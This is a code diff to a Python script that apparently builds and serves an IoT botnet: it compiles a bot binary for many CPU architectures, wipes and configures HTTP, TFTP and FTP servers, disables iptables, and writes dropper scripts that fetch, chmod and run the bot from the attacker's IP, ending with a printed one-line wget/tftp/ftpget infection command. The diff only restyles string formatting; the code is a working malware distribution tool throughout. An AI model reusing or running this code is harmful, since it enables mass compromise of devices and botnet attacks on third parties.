@@ -78,7 +78,7 @@ getarch = [
     'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv5l.tar.bz2', #armv5l
     'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv6l.tar.bz2', #armv6l
 	]
-	
+
 ccs = [
     "cross-compiler-mips", #mips
 	"cross-compiler-mips64", #mips64
@@ -126,31 +126,27 @@ if depends.lower() == "y":
     system("yum install nmap -y")
 else:
     depends_install = False
-	
+
 # *** CROSS COMPILING ***
 yourafag = raw_input("Download Cross Compilers? Y/n: ")
-if yourafag.lower() == "y":
-    get_arch = True
-else:
-    get_arch = False
+get_arch = yourafag.lower() == "y"
 system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
-if get_arch == True:
+if get_arch:
     system("rm -rf cross-compiler-*")
 
     print("Downloading Architectures")
 
     for arch in getarch:
-        system("wget " + arch + " --no-check-certificate >> /dev/null")
+        system(f"wget {arch} --no-check-certificate >> /dev/null")
         system("tar -xvf *tar.bz2")
         system("rm -rf *tar.bz2")
 
     print("Cross Compilers Downloaded...")
-num = 0
-for cc in ccs:
+for num, cc in enumerate(ccs):
     arch = cc.split("-")[2]
-    system("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
-    num += 1
-
+    system(
+        f"./{cc}/bin/{arch}-gcc -static -pthread -D{arch.upper()} -o {compileas[num]} {bot} > /dev/null"
+    )
 # *** TFTP/HTTPD CONFIG ***
 system("yum install httpd -y")
 system("service httpd start")
@@ -191,29 +187,37 @@ system("service vsftpd restart")
 # *** GTOP ***
 system('echo -e "#!/bin/bash" > /var/www/html/gtop.sh')
 for i in compileas:
-    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/gtop.sh')
-	
+    system(
+        f'echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://{ip}/{i}; chmod +x {i}; ./{i}; rm -rf {i}" >> /var/www/html/gtop.sh'
+    )
+
 # *** FTP ***
 for i in compileas:
-    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    system(
+        f'echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} {i} {i}; chmod 777 {i} ./{i}; rm -rf {i}" >> /var/ftp/ftp1.sh'
+    )
 
 # *** TFTP1 ***
 system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
 system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
 system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
 for i in compileas:
-    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-	
+    system(
+        f'echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp {ip} -c get {i};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh'
+    )
+
 # *** TFTP2 ***
 system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
 system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
 system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
 for i in compileas:
-    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    system(
+        f'echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp -r {i} -g {ip};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh'
+    )
 for i in compileas:
-    system("cp " + i + " /var/www/html")
-    system("cp " + i + " /var/ftp")
-    system("mv " + i + " /var/lib/tftpboot")
+    system(f"cp {i} /var/www/html")
+    system(f"cp {i} /var/ftp")
+    system(f"mv {i} /var/lib/tftpboot")
 
 # *** RESTARTING SERVICES ***
 print("Stopping Iptables")
@@ -236,7 +240,9 @@ system('echo "ulimit -u 999999">> .bashrc')
 system('echo "ulimit -n 999999">> .bashrc')
 
 # *** CREDZ ***
-system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://' + ip + '/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp ' + ip + ' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g ' + ip + '; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> /root/p2p/wget.txt')
+system(
+    f'echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://{ip}/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp {ip} -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g {ip}; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 {ip} ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> /root/p2p/wget.txt'
+)
 print("\x1b[0;32mYour link: cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://" + ip + "/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
 print
 print("\x1b[0;32mRecoded By ~B1NARY~\x1b[0m")
